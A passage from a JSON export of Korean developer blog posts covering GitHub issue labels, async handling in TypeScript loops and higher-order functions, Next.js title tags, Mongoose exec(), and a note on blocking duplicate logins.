- 문제점\n  - 뭔가 버그가 제보되거나, 내가 찾은 경우 이 라벨을 붙여서 등록한다.\n  - 정말 긴급 이슈는 Hotfix로 넘어가며, 같이 태깅 된다.\n\n<p></p>\n\n- Code-Refactoring\n  - 기능 우선 개발을 하다보면 코드가 엉망이 되길 마련이다.\n  - 또한 코드의 품질 개선 및 더 나은 방향으로 작성해야 할 때 사용하는 라벨이다.\n  - 등록은 많이 하지만... 사실 시간 부족으로 우선 순위가 많이 밀리는 라벨이다.\n\n<p></p>\n\n- Feature\n  - 하나의 기능을 담당한다.\n  - 뭐 예를 들면 데이터를 가져와서 테이블에 뿌리는 작업을 의미한다.\n  - 물론 더 큰 기능을 지칭하기도 하는데 세부적인 것은 Sub-Feature로 나눠서 하기도 한다.\n\n<p></p>\n\n- Hotfix\n  - 긴급 패치용 브런치\n  - 만약 배포를 하거나 버그를 찾았는데 매우 긴급한 경우 사용하는 라벨.\n  - Bug 라벨과 함께 쓰일 수 있다.\n\n<p></p>\n\n- Sub-Feature\n  - Feature에서 너무 큰 경우 이 라벨을 통해서 분리할 수 있다.\n  - Feature랑 함께 사용한다.\n\n<p></p>\n\n- release\n  - 메인 브런치에서 배포용 브런치를 딴 후 운영 브런치에 Pull-Request 할 때 사용하는 라벨\n\n<p></p>\n\n- Pull-Request\n  - 일반적으로 PR시 사용하는 라벨\n\n<br>\n\n이렇게 라벨과 이슈를 묶어서 사용하면 구분하기도 편하고, 이 이슈가 하나의 기능 리포트,  \n또는 버그 해결을 처리한 리포트 문서가 될 수도 있다.\n\n물론 오픈 소스를 개발할 경우 이런 라벨링은 좋은 형태는 아니다.  \n하지만 개인 프로젝트나 소규모 프로젝트를 할 때 기본 뼈대로 사용하기엔 좋은 것 같다.\n\n**Pull-Request**의 경우 브런치 전략에서 언급한 바와 같이 메인 브런치를 기준으로 PR을 한다.  \n그리고 운영 배포를 할 경우 **Release** 태그를 붙여서 함께 사용한다.\n\n![](/img11.png)\n\n<br>\n\n대충 PR은 이런 형태를 띄게 된다.\n\n<br>\n\n### 마일스톤\n\n이정표인데 노션의 **버전 노트**랑 성향이 비슷하다.\n\n![](/img12.png)\n\n<br>\n\n그래서 나는 대충 적었다. -\\_-;;  \n원래는 노션 노트와 동기화 해야 하지만...  \n깃허브 정리도 한번 해야 할 듯 싶다.\n\n이 마일스톤을 통해서 이슈를 언제까지 어느 버전에서 처리할 것인지를 관리할 수 있다.  \n만약 노션을 안쓰게 되면 이 마일스톤을 잘 활용하면 될 듯 싶다.\n\n<br>\n\n## 정리\n\n지금까지 내가 쓰는 개인 프로젝트 관리 방법을 공유해봤다.  \n사실 나도 계속 바꾸고 적용해본다.\n\n이 방법은 1인보다는 2~5인 사이의 규모에서 쓰기 좋은 것 같다.  \n하지만 내가 이렇게 하는 이유는 조만간 다시 직장을 구하게 되면(?) 이런 협업 시스템이나,  \n체계화 된 시스템을 몸에 계속 익혀 두는게 좋을 것 같아서 그렇다.\n\n뭐 성격상 저렇게 하는 것을 좋아하는 것도 있고...  \n일단 지금은 1인 개발인데 혼자 하게 되면 코드 팔로우나 이슈 트래킹이 생각보다 어렵다.\n\n지금 하는 흑우집합소의 규모가 아주 조금 큰 것도 있고,  \n사람은 항상 기록을 해야 추후에 쫒기 편하다.\n\n혹시 이런 것에 대해 고민하고 방법을 아직 못 찾은 분이라면 이런 방법도 있구나 라고 보면 좋을 것 같다.  \n물론 이것보다 더 나은 방법을 쓰는 분들도 많을 것이다.\n\n그런 분들 중에 혹시 보완할게 보인다면 댓글로 글을 남겨주시면 감사하겠다.\n\n너무 오랜만에 블로그 포스팅을 안하다 글을 쓰려니 좀 더뎌졌다.  \n앞으로는 좀 부지런하게 글을 써봐야 할 듯 싶다.\n\n```toc\n\n```\n"},{"excerpt":"반복문에서 비동기를... 최근 개발 일정 및 개인 사정으로 인해 포스팅을 전혀 하지 못했다. 네이버 블로그는 일상이나 가벼운 소재라서 막 쓸수 있지만 개발 블로그는... 아무렇게나 막 싸지르는 공간도 아니고, 다른 예제 복붙하는거는 정말 싫어해서... 그래서 더 미루지 않았나 싶다. ㅎㅎ 흑우집합소 패치 내역이나 개발한 걸 TIL 쪽에 올리려다가 이제는 …","fields":{"slug":"/js_ts/230523_loop-in-async/"},"frontmatter":{"date":"May 23, 2023","title":"반복문에서 비동기 처리하기 (for, map, async, await)","description":null,"tags":["Typescript"],"series":"JS_TS","previewImage":"typescript_logo.png","isPrivate":null},"rawMarkdownBody":"\n![무더운 여름(?)엔 스파클링 와인과 개발을...](/img00.png)\n\n# 반복문에서 비동기를...\n\n최근 개발 일정 및 개인 사정으로 인해 포스팅을 전혀 하지 못했다.  \n네이버 블로그는 일상이나 가벼운 소재라서 막 쓸수 있지만 개발 블로그는...\n\n아무렇게나 막 싸지르는 공간도 아니고, 다른 예제 복붙하는거는 정말 싫어해서...  \n그래서 더 미루지 않았나 싶다. ㅎㅎ\n\n흑우집합소 패치 내역이나 개발한 걸 TIL 쪽에 올리려다가 이제는 따로 카테고리를 빼야 할 듯 싶다.  \n이것도 많이 밀렸는데 언제 적는지...\n\n무튼...  \n평화롭게(?) 개발을 하다가 반복문을 사용하면서 비동기 처리하다가 조금 막힌 부분이 있었다.  \n이번 포스팅에서는 그 문제, 그리고 조사, 해결방법을 공유하고자 포스팅을 남겨본다.\n\n## 반복문에서 비동기를 쓸 때\n\n일반적으로 반복문 내에서 비동기 처리를 하는 경우는 드물게 있다.  \n예를 들어 특정 파라메터를 가지는 url의 데이터를 크롤링하거나,  \n데이터베이스에서 순차적으로 뽑아오는등... 몇 가지 케이스가 있다.\n\n근데 **while**이나 **for** 등과 같은 고전파 방식인 반복 순회에서는 비동기가 잘 동작한다.  \n하지만 **고차함수(高次函數)**의 **map**, **filter**, **foreach**등에서는 이 비동기가 생각한 대로 흘러가지 않는다.\n\n왜 그런걸까?\n\n<br>\n\n## 간단한 예제부터 시작\n\n그냥 급조한 예제 코드다...  \n와인의 재고를 찾는 코드가 있다고 해보자.  \n(여담인데 떼땅져... 6만원 밖에 안하는데 정말 맛있다.)\n\n**그리고 아래 코드는 [타입스크립트 플레이그라운드](https://www.typescriptlang.org/play)에서 동작하는 코드다.**  \n만약 직접 typescript 코드를 작성한다면 일부 코드에 **await**키워드를 붙여야 한다.\n\n```typescript\nasync function Run() {\n  //와인 수량 저장 스토어\n  const wineStore: { [key: string]: number } = {\n    taittinger: 10, //떼땅져는 10개\n    piper_heidsieck: 12, //파이퍼 하이직은 12개\n    andre_clouet: 21, //앙드레 끌루에는 21개\n    opus_one: 5, //오퍼스원은 5개\n    pounamu: 31, //푸나무는 31개\n  }\n\n  //찾는 시간\n  const findTime = (ms: number) => {\n    return new Promise(resolve => setTimeout(resolve, ms))\n  }\n\n  //와인 검사\n  const checkWineCnt = async (wineName: string): Promise<number> => {\n    const ms = Math.floor(Math.random() * (3 - 1 + 1) + 1) * 1000\n    console.log(\"find start... during ms = \", ms)\n    const cnt = await findTime(ms).then(v => wineStore[wineName])\n    console.log(\"[\" + wineName + \"] count = \" + cnt)\n    console.log(\"find end... \")\n    return cnt\n  }\n\n  checkWineCnt(\"opus_one\")\n}\n\nRun()\n```\n\n<br>\n\n**findTime 함수**는 1~3초 랜덤으로 찾는 시간을 밀리세컨으로 생성한다.  \n**checkWineCnt** 함수는 전달받은 와인 이름으로 몇개가 있는지 조회를 한다.\n\n현실은 그냥 와인셀러 열고 꺼내면 되지만 -\\_-;;  \n뭐 그냥 샘플 예제니까...넘 억까라 해도 양해 바란다.\n\n무튼 이렇게 반복문을 안쓰는 예제에서 시작해보겠다.  \n만약 스토어에 있는 모든 와인을 조회해보고 싶다면 아래처럼 하단에 코드를 변경할 수 있다.\n\n```typescript\nasync function Run() {\n  const wineList: string[] = Object.keys(wineStore)\n\n  const runFunc = async () => {\n    for (let i = 0; i < wineList.length; i++) {\n      await checkWineCnt(wineList[i])\n    }\n  }\n\n  searchAllFunc()\n}\n\nRun()\n```\n\n이렇게 할 경우 우리가 생각한 대로 동작을 한다.\n\n![](/loop02.gif)\n\n<br>\n\n### ForEach\n\n근데 **for**를 사용하면 우리가 생각한 대로 잘 동작하지만, 고차함수를 통해서 작업을 하면 다르게 처리된다.  \n위와 같은 작업을 고차함수인 **foreach**로 바꾸면 아래와 같다.\n\n```typescript\nasync function Run() {\n  const wineList: string[] = Object.keys(wineStore)\n\n  wineList.forEach(async (item: string) => await checkWineCnt(item))\n}\n\nRun()\n```\n\n<br>\n\n이렇게 하고 결과를 보면 아래와 같다.\n\n![](/loop03.gif)\n\n전혀 비동기로 동작하지 않는다.  \n이유는 간단하다.\n\n**고차함수인 ForEach는 비동기를 기다리지 않는다.**  \n좀 더 정확히 이야기 하면 **ForEach는 Promise를 인지하지 못한다.**\n\n<br>\n\n### How to solve?\n\n뭐 간단하다.\n\n1. For loop를 사용한다.\n2. For of를 사용한다.\n\n1번은 맨 처음 예제에서 사용한 방식이고, 2번은 아래와 같다.\n\n```typescript\nasync function Run() {\n  const forOfLoop = async () => {\n    for (const [value] of wineList) {\n      await checkWineCnt(value)\n    }\n  }\n  forOfLoop()\n}\n\nRun()\n```\n\n뭐 좀 억지스럽긴 한 코드인데, 이해를 돕는 코드이니 넘어가자.  \n사실 제일 좋은 건 1번인 것 같다.\n\n굳이 비동기 루프 코드를 따로 작성하지 않고, 그냥 그 자리에서 For를 시전하면 되니까?  \n취향껏 쓰자.\n\n<br>\n\n### Map\n\n이번엔 와인의 이름과 수량을 문자열로 합쳐서 만드는 것을 해야 한다고 가정하자.  \n결과물을 배열이고, 안에는 와인명-수량 이라는 형태로 간다고 하자.\n\n예를 들면 [taittinger-10, \"piper_heidsieck-12\"...] 이렇게 말이다.\n\n그럼 고차함수인 **Map**을 활용해서 변환할 수 있다.  \n아래의 코드를 참고하자.\n\n```typescript\nasync function Run() {\n  const wineList: string[] = Object.keys(wineStore)\n\n  const result = wineList.map(async (item: string, idx: number) => {\n    const cnt = await checkWineCnt(wineList[idx])\n    return item + \"-\" + cnt\n  })\n\n  console.log(\"result = \", result)\n}\n\nRun()\n```\n\n우리가 원하는 결과는 아마 **checkWineCnt**함수를 수행하면서 find start end 맨트가 각각 뜨고,  \n그 다음 마지막으로 result의 콘솔 결과가 출력되길 원할 것이다.\n\n하지만 결과는...\n\n![](/map01.gif)\n\n<br>\n\n그리고 중간에 로그를 보면 다음과 같이 되어 있는 것을 확인할 수 있다.\n\n```\n\"result = \",  [Promise: {}, Promise: {}, Promise: {}, Promise: {}]\n```\n\n그렇다.  \n전부 **Promise**형태로 된 배열이 있다.  \n즉 **Map**도 비동기를 처리하지 못한다는 뜻이다.\n\n물론 얘는 Promise가 왔으니 해결할 방법은 있다.\n\n<br>\n\n### How to solve?\n\n```typescript\nasync function Run() {\n  const wineStore: { [key: string]: number } = {\n    taittinger: 10,\n    piper_heidsieck: 12,\n    andre_clouet: 21,\n    opus_one: 5,\n  }\n\n  const findTime = (ms: number) => {\n    return new Promise(resolve => setTimeout(resolve, ms))\n  }\n\n  const checkWineCnt = async (wineName: string): Promise<number> => {\n    const ms = Math.floor(Math.random() * (3 - 1 + 1) + 1) * 1000\n    console.log(\"find start... during ms = \", ms)\n    const cnt = await findTime(ms).then(v => wineStore[wineName])\n    console.log(\"[\" + wineName + \"] count = \" + cnt)\n    console.log(\"find end... \")\n    return cnt\n  }\n\n  const wineList: string[] = Object.keys(wineStore)\n\n  const mapResult = wineList.map(async (item: string, idx: number) => {\n    const cnt = await checkWineCnt(wineList[idx])\n    return item + \"-\" + cnt\n  })\n\n  const callPromiseAll = async () => {\n    const data = await Promise.all(mapResult)\n    console.log(\"data = \", data)\n    return data\n  }\n\n  callPromiseAll()\n}\n\nRun()\n```\n\n<br>\n\n위 코드를 수행하면 아래처럼 확인할 수 있다.\n\n![](/map02.gif)\n\n보면 **checkWineCnt**함수의 실행은 비동기로 동작하지 않지만, 결과는 제대로 나온다.\n\n<br>\n\n### Filter\n\n이번엔 수량이 20개 이상인 와인만 가져오고 싶다고 가정해보자.\n\n```typescript\nasync function Run() {\n  const wineStore: { [key: string]: number } = {\n    taittinger: 10,\n    piper_heidsieck: 12,\n    andre_clouet: 21,\n    opus_one: 5,\n  }\n\n  const findTime = (ms: number) => {\n    return new Promise(resolve => setTimeout(resolve, ms))\n  }\n\n  const checkWineCnt = async (wineName: string): Promise<number> => {\n    const ms = Math.floor(Math.random() * (3 - 1 + 1) + 1) * 1000\n    console.log(\"find start... during ms = \", ms)\n    const cnt = await findTime(ms).then(v => wineStore[wineName])\n    console.log(\"[\" + wineName + \"] count = \" + cnt)\n    console.log(\"find end... \")\n    return cnt\n  }\n\n  const wineList: string[] = Object.keys(wineStore)\n\n  const filterResult = wineList.filter(async (item: string, index: number) => {\n    const cnt = await checkWineCnt(wineList[index])\n    return cnt >= 20\n  })\n\n  console.log(\"filterResult = \", filterResult)\n}\nRun()\n```\n\n<br>\n\n이렇게 하면 앙드레 끌루에만 배열로 반환되어야 한다.  \n근데 결과를 보면 전체 다 반환된다.\n\n![](/filter01.gif)\n\n```\n \"filterResult = \",  [\"taittinger\", \"piper_heidsieck\", \"andre_clouet\", \"opus_one\"]\n```\n\n이유는 이것도 Map과 비슷한데**filter의 콜백은 Promise**를 반환하고, 이는 언제나 **true**로 인정된다.  \n그래서 전체 다 반환되는 것이다.\n\n얘는 해결하려면 약간 코드가 너저분해지는데 map을 사용해서 처리할 수 있다.\n\n<br>\n\n### How to solve?\n\n아래는 해결 코드다.\n\n```typescript\nasync function Run() {\n  const wineStore: { [key: string]: number } = {\n    taittinger: 10,\n    piper_heidsieck: 12,\n    andre_clouet: 21,\n    opus_one: 5,\n  }\n\n  const findTime = (ms: number) => {\n    return new Promise(resolve => setTimeout(resolve, ms))\n  }\n\n  const checkWineCnt = async (wineName: string): Promise<number> => {\n    const ms = Math.floor(Math.random() * (3 - 1 + 1) + 1) * 1000\n    console.log(\"find start... during ms = \", ms)\n    const cnt = await findTime(ms).then(v => wineStore[wineName])\n    console.log(\"[\" + wineName + \"] count = \" + cnt)\n    console.log(\"find end... \")\n    return cnt\n  }\n\n  const wineList: string[] = Object.keys(wineStore)\n\n  const promiseWineList = wineList.map(\n    async (item: string, index: number) => await checkWineCnt(wineList[index])\n  )\n  const cntWineList = await Promise.all(promiseWineList) //[10, 12, 21, 5]\n\n  const filterResult = wineList.filter((item: string, index: number) => {\n    const cnt = cntWineList[index]\n    return cnt >= 20\n  })\n\n  console.log(\"filterResult = \", filterResult)\n}\n\nRun()\n```\n\n<br>\n\n그럼 아래와 같이 출력된다.\n\n![](/filter02.gif)\n\n코드가 약간 지저분해지는데 처리는 된다.\n\n<br>\n\n### reduce\n\n이번엔 저 와인들의 수량을 모두 합치는 것을 해보려 한다고 가정하자.  \n뭐 그냥 for문 사용해서 할 수 있지만, 고차함수 중 **reduce**라는 것을 쓰면 더 편하게 할 수 있다.  \n아래는 와인 총합을 구하는 **reduce**를 사용한 코드다.\n\n```typescript\nconst sum0 = await wineList.reduce(async (sum: number, item: string) => {\n  const cnt = await checkWineCnt(item)\n  return (await sum) + cnt\n}, 0)\n```\n\n<br>\n\n근데 이렇게 작성하면 typescript 에러가 발생할 것이다.\n\n![thumbnail](/img01.png)\n\n<br>\n\n뭔가 장황한 에러가 있는데 그냥 쉽게 생각하면 **sum : number**라는 것에 있다.  \nasync 함수가 되는 순간 반환은 **Promise**값으로 온다.\n\n저기 reduce 함수의 첫 인자는 반환 값인데 보면 쎙으로 **number**로 되어 있다.  \n또한 초기 값도 Promise가 아닌 0으로 되어 있다.  \n그래서 저 부분을 고치면...\n\n```typescript\nconst sum = await wineList.reduce(\n  async (sum: Promise<number>, item: string) => {\n    const cnt = await checkWineCnt(item)\n    return (await sum) + cnt\n  },\n  Promise.resolve(0)\n)\n```\n\n<br>\n\n이렇게 바꾸면 이제 정상적으로 출력이 된다.\n\n![](/reduce.gif)\n\n위 코드가 typescript라서 미연에 방지가 된거다.  \n만약 javascript를 사용하고 있었더라면 이상한 Promise랑 겹쳤을 것이다.\n\n## 정리\n\n지금까지 고차함수의 일부에서 비동기를 사용할 때 문제점과 해결방법을 알아봤다.  \n약간 억까 예제가 좀 있었지만... 문제의 본질과 해결 방법은 충분히 전달되었을거라 믿는다.\n\n다시한번 정리하면 다음과 같다.\n\n1. foreach는 비동기를 할 수 없기에 다른 반복문을 사용하자.\n2. map은 **Promise** 배열을 반환하기에 **Promise.all()**을 사용하여 처리하자.\n3. filter는 map 등으로 처리 후 Promise.all()로 값을 변환한 후 사용하자.\n4. reduce는 typescript 사용으로 미연에 방지할 수 있으며, 반환 값의 Promise를 잘 사용하자.\n\n이정도로만 알고 있으면 잘 쓸수 있다.  \n근데 모르면 그냥 GPT한테 예제를 보여달라고 하자.  \n그렇다고 운영코드를 올리진 말고...\n\n```toc\n\n```\n"},{"excerpt":"Next.Js에서 Title 태그를 처리하기 이번에 흑우집합소를 네이버 서치 어드바이저에 등록했다. 그리고 데이터를 등록하다가 사이트 간단 체크에 돌렸는데 사이트 제목이 미설정이라 떴다. 그래서 확인해보니 정말 설정이 안되어 있었다.  그래서 이것을 수정하려고 자료를 찾아서 적용했다. 방법은 간단한데 각 페이지마다 Title 태그를 적용하는 법과 전역으로…","fields":{"slug":"/next-js/230505_nextjs_title/"},"frontmatter":{"date":"May 05, 2023","title":"Next.Js에서 title 태그 변경 처리","description":null,"tags":["NextJs"],"series":"NextJs","previewImage":"nextjs_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nextjs.png)\n\n# Next.Js에서 Title 태그를 처리하기\n\n이번에 [흑우집합소](https://bcow.world)를 [네이버 서치 어드바이저](https://searchadvisor.naver.com)에 등록했다.  \n그리고 데이터를 등록하다가 [사이트 간단 체크](https://searchadvisor.naver.com/tools/sitecheck)에 돌렸는데 사이트 제목이 미설정이라 떴다.\n\n그래서 확인해보니 정말 설정이 안되어 있었다.\n\n![](/img01.png)\n\n그래서 이것을 수정하려고 자료를 찾아서 적용했다.  \n방법은 간단한데 **각 페이지마다 Title 태그를 적용**하는 법과 **전역으로 설정하는 법**이 있다.\n\n## 1. 각 페이지마다 title 처리\n\n각 페이지마다 Title을 변경해야 할 때가 있다.  \n나의 경우 메인과 각 페이지가 다르게 설정해야 했다.\n\n메인은 아래처럼 진행해야 했고...\n\n![](/img02.png)\n\n번호 생성쪽은 그에 맞춰서 다른 것으로 해줘야 했다.\n\n![](/img03.png)\n\n처리하는 방법은 간단하다.  \n**pages** 디렉토리 안에 라우팅 되는 곳에 아래의 코드로 설정이 가능하다.\n\n```tsx\nimport Head from \"next/head\"\n\nexport default function Home(props: MainPageProps) {\n  return (\n    <>\n      <Head>\n        <title>흑우집합소 - 다음 1등은 당신입니다 ^^</title>\n      </Head>\n    </>\n  )\n}\n```\n\n이렇게 하면 된다.\n\n## 전역 설정하기\n\n여기는 더 쉽다.  \n**\\_app.js** 파일에 위 처럼 작성해서 넣어주면 된다.\n\n```tsx\nimport { Html, Head } from \"next/document\"\n\nexport default class MyDocument extends Document {\n  render() {\n    return (\n      <Html lang=\"ko\" data-theme=\"emerald\">\n        <Head>\n          <title>흑우집합소 - 다음 1등은 당신입니다 ^^</title>\n        </Head>\n      </Html>\n    )\n  }\n}\n```\n\n## 정리\n\n생각보다 어렵지 않다.  \n단지 페이지가 많으면 약간 귀찮을 뿐이다.\n\n자신만의 서비스에 title 적용이 안되어 있다면 얼른 적용해보도록 하자.\n"},{"excerpt":"Chat GPT에게 코드를 맡기다가... MongoDB쪽에서 데이터를 가져오는 부분에 대해서 GPT에게 명령을 줬다. 근데 가져올 때 코드를 보니 신기한 게 있었다. 근데 GPT가 제공한 코드를 보면 끝에 **.exec()**를 사용한다. 그래서 이 부분에 대해 궁금했다. 쓰면서 딱히 문제는 안되었는데 이런 부분은 모르고 넘어가면 더 큰 문제가 발생할 수…","fields":{"slug":"/nest_js/230505_mongoose_exec/"},"frontmatter":{"date":"May 05, 2023","title":"Mongoose 사용 시 exec()는 무엇인가?","description":null,"tags":["NestJs","MongoDB"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nestjs.png)\n\n# Chat GPT에게 코드를 맡기다가...\n\nMongoDB쪽에서 데이터를 가져오는 부분에 대해서 GPT에게 명령을 줬다.  \n근데 가져올 때 코드를 보니 신기한 게 있었다.\n\n```typescript\n//내가 작성한 코드\nawait this.entity.findByIdAndDelete(params.itemId);\n\n//GPT가 제시한 코드\nawait this.entity.findByIdAndDelete(params.itemId).exec();\n```\n\n근데 GPT가 제공한 코드를 보면 끝에 **.exec()**를 사용한다.  \n그래서 이 부분에 대해 궁금했다.\n\n쓰면서 딱히 문제는 안되었는데 이런 부분은 모르고 넘어가면 더 큰 문제가 발생할 수 있으니까?\n\n## exec()는?\n\n사실 exec()를 쓰고 안쓰고는 큰 차이는 없다.  \n왜냐하면 **기능적으로는 완전히 동일**하다.\n\nMongoose에서 대부분의 쿼리 메서드는 exec()를 호출하지 않아도 잘 동작한다.  \n하지만 **save()** 같은 쿼리 메서드에는 붙이지 않는다.\n\n근데 이게 Mogoose 3 버전대에서는 쿼리 메서드에서 사용하는 쿼리를 프로미스로 만들기 위해서는 exec()를 필수로 붙여줘야 했다.  \n하지만 4버전 이후부터는 자체적으로 처리를 하기 때문에 exec()를 붙이지 않아도 되게 되었다.\n\n하지만 가독성과 다른 코드와의 일관성을 위해서 exec()를 사용하는 것을 권장한다.  \n공식문서에서도 exec() 사용을 권장한다.\n\n[Mongoose 공식 문서 Promise 참고](https://mongoosejs.com/docs/promises.html)\n\n```toc\n\n```\n"},{"excerpt":"이중 로그인(중복 로그인) 문제를 해결하는 과정 흑우집합소는 정책 상 이중 로그인을 허용하지 않기로 정했다. 예를 들어 A라는 사용자가 크롬에서 로그인하고, 다시 사파리에서 로그인을 했을 때 이를 이중 로그인이라 칭한다. (때에 따라선 중복 로그인이라 표현하기도 한다.) 뭐 개발좀 해본 사람이라면 다들 알것이다. 근데 계정 로그인 이후 단순하게 정보를 열…","fields":{"slug":"/til/230219_til/"},"frontmatter":{"date":"May 05, 2023","title":"23년 2월 19일 TIL & 개발노트 (이중 로그인 관련 고민과 해결)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 이중 로그인(중복 로그인) 문제를 해결하는 과정\n\n[흑우집합소](https://bcow.world)는 정책 상 이중 로그인을 허용하지 않기로 정했다.  \n예를 들어 A라는 사용자가 크롬에서 로그인하고, 다시 사파리에서 로그인을 했을 때 이를 **이중 로그인**이라 칭한다.  \n(때에 따라선 중복 로그인이라 표현하기도 한다.)\n\n뭐 개발좀 해본 사람이라면 다들 알것이다.  \n근데 계정 로그인 이후 단순하게 정보를 열람하거나, **Read**성향에 촛점이 맞춰진 서비스라면 이중 로그인은 문제가 되지 않는다.\n\n하지만 내가 개발하는 [흑우집합소](https://bcow.world)는 추후 게시글 작성 기능 등 **Create**와 **Update** 그리고 **Delete**기능을 가진다.  \n이 경우 이중 로그인 문제는 고려해야 할 문제다.\n\n## 어떤 부분을 고려해야 할까?\n\n먼저 개발하는 서비스의 로그인 방식부터 확인해봐야 할 것이다.  \n로그인 방식에는 다양한 방법이 존재한다.\n\n그리고 그 로그인 방식에 따라 이중 로그인 처리 방법이 약간 다르고,  \n처리하는 방식이 쉬울수도, 까다로울 수도 있다.\n\n> **여기 아래서 부터는 Next.Js 기준으로 설명을 진행한다.**\n\n<br>\n\n### 서버 세션 방식\n\n만약 로그인 방식이 고전 클래식 스타일인 서버 세션에 저장하는 방식이라면 구현이 더 용이할 것이다.\n\n왜냐하면 로그인 정보를 세션에 넣어두고, 새로운 로그인 정보가 올 경우 기존에 있는 정보는 무효화 하면 되기 때문이다.  \n한가지 포인트는 **서버 세션에 무엇을 넣는가?**인데 일단 서비스마다 로그인 정보는 다르니까 이 부분은 넘긴다.\n\n어떤 정보인지는 아래서 자세히 다뤄보겠다.  \n단지 간단히 언급하면 **클라이언트의 고유 값**이 필요하다는 것이다.  \n이는 아래의 [서버 내 저장하는 데이터](https://elfinlas.github.io/til/230219_til/#서버-내-저장하는-데이터)세션을 참고하자.\n\n<br>\n\n### SNS 로그인 방식\n\n이 경우 SNS 로그인 방식의 구현 방법에 따라 약간 까다로울 수 있다.  \n구글, 애플, 네이버 등 SNS 로그인을 제공하는 OAuth를 통해서 로그인을 진행한 경우 로그인 정보를 받고 **JWT**를 제공받을 것이다.\n\n보통은 JWT를 많이 준다.  \n많이 사용하는 Access와 Refresh 두 가지를 이용하는 방식이다.\n\n근데 서비스 내에서 사용자 정보를 보관하지 않거나, 간단하게 정보만 받는 경우는 매우 드물고...  \n보통 사용자 정보를 서비스 내에 저장하고 두기 때문에 위에서 언급한 방법과 유사하게 구현이 된다.\n\nOAuth에서 제공하는 JWT를 사용하는 경우 서버 세션에 해당 JWT정보를 주고,  \n다른 브라우저에서 로그인 한 경우 서버에서 저장한 JWT를 비교하는 방식으로 기존에 로그인 한 정보를 파기할 수 있다.\n\n만약 JWT 검증을 OAuth측에 맡길 경우 이 부분은 서버측에서 다른 이중 로그인 관련 정보를 들고 있어야 한다.\n\n하지만 OAuth측에서 제공하는 사용자 정보만 받고 보안 인증을 직접 운영한다면,  \n위의 서버 세션 방식이나 아래의 JWT 방식을 사용할 것이다.\n\n<br>\n\n### JWT 방식\n\n만약 서버 세션 방식을 사용하지 않고, 토큰 방식 중 하나인 **JWT**를 사용하는 경우 생각할 게 많아진다.  \nJWT는 한번 발급을 하면 서버측에서 제어할 수 없다.\n\n의존할 것은 JWT 내에 있는 **Expired Date**에 의존할 수 밖에 없다.  \n근데 이중 로그인은 저 만료시간이 중요하지 않다.\n\n언제 로그인을 할 지는 무작위로 발생하기 때문이다.  \n그래서 많은 고민이 드는 방법이다.\n\n내 개인적인 경험 바운더리 안에서 **순수 JWT를 사용할 경우 이중 로그인을 막을 수 없다.**  \n그래서 서버 세션을 쓰던 디비에서 로그인 정보를 관리하던 해야 한다.\n\n이럴 경우 JWT를 쓰는 의미는 사라진다.  \n로그인 정보를 서버 내에 있는 자원(세션, 디비)에 의존하지 않으려 사용한 것이기 때문이다.\n\n그래서 JWT를 쓰는 경우 **이중 로그인을 막으려면 결국 서버 자원에 의존할 수 밖에 없다.**\n\n<br>\n\n## 서버 내 저장하는 데이터\n\n서비스마다 로그인 고유 정보는 다르니 빼기로 하고...  \n그럼 해당 브라우저로 접근했을 때 A와 B 로그인 정보가 다름을 확인하는 **고유 값**은 어떻게 만들어야 하는 것인가?\n\n필자는 아래와 같은 고민을 하면서 방법을 찾아봤다.\n\n<br>\n\n### UserAgent\n\n중요한 것은 클라이언트를 구분하는 정보인데, 보통 생각하면 **UserAgent** 값을 생각할 수 있다.  \n**UserAgent**는 사용자의 브라우저 정보를 담고 있다.\n\n그래서 로그인 정보에 UserAgent를 담아볼까 생각했다.  \n하지만 이건 좋은 방법은 아니다.\n\n근데 만약 크롬의 새로운 윈도우 또는 다른 방식으로 띄울 경우 **UserAgent**는 유일한 값이 아닐 수 있다.  \n웹개발자라면 명심하겠지만 **절대 사용자를 믿지 말라** 라는 말을 기억할 것이다.\n\n그래서 UserAgent는 고유 값으로 쓸 수 없기에 이는 빼기로 했다.\n\n<br>\n\n### 토큰 또는 UUID(고유 식별자)\n\n> 일종의 토큰을 생성해서 로그인 시 서버로 전달한다면?\n\n이 생각이 들었다.  \n그래서 이 방식을 접목하려 했다.\n\n먼저 고려해야 할 것은 **토큰을 생성해주는 주체는 어디가 되어야 하는가?** 이다.\n\n서버로 올 경우 매번 로그인 페이지에 접근할 때 토큰을 서버에게 요청해야 한다. (Axios 등으로)\n그리고 SNS 로그인을 사용할 경우 약간의 문제가 생긴다.\n\nSNS 로그인 방식을 사용할 경우 해당 OAuth 주체에게 그 정보를 어떻게 제공해야 하는가가 문제였다.  \n**헤더에 정보를 넣어서 보내봤는데 정보가 제대로 안왔고, 추후 OAuth 주체가 정책을 변경하면 문제가 생긴다.**\n\n그럼 클라이언트에서 정보를 생성한다면?  \n근데 결국 클라이언트도 SNS 로그인 방식 때문에 위와 같은 문제에 봉착한다.\n그렇다면 어떻게 해야 할까?\n\n<br>\n\n## 해결 방법을 찾다.\n\n> SNS 로그인 방식으로 설명한다.  \n> 다른 방법은 그냥 서버에 정보를 저장하면 끝이기 때문이다.  \n> 단 서버에 어떤 정보를 저장하는지 관점으로 보면 좋을 듯 하다.\n\n일단 일차적으로 찾은 방법은...  \n**SNS 로그인 이후 콜백에서 클라이언트로 정보를 보낼 때 서버측에서 토큰이나 UUID 정보를 전달**하는 방법이었다.\n\n그리고 저 토큰이나 UUID를 쿠키나 로컬 스토리지에 저장하고, 서버와 통신할 때 헤더에 같이 보내면 된다.  \n근데 이렇게 할 경우 이런 문제가 발생할 수 있다.\n\n> 1. 악의를 가진 사용자가 서버에서 온 토큰 또는 UUID를 탈취해서 사용할 경우?\n> 2. 토큰이나 UUID 자체가 평문이라 복사해서 바로 사용할 수 있다면?\n\n그래서 나는 몇 가지 고민을 하다가 아래와 같은 스텝을 생각해봤다.  \n프론트, 백엔드 둘 다 약간의 작업이 필요하다.\n\n<br>\n\n### 1. 프론트엔드 측 토큰 생성\n\n초기 페이지에 들어오면 프론트엔드측에서 토큰을 하나 만들어서 LocalStorage와 쿠키에 저장을 해둔다.  \n토큰은 암호화(해시 아님)해서 저장한다.\n\n쿠키를 사용하는 이유는 Next.Js에서 ServerSide 측에서 처리할 때 LocalStorage 쪽은 접근할 수 없다.  \n하지만 쿠키는 접근이 가능하기에 두 영역에 저장을 해준다.\n\n참고로 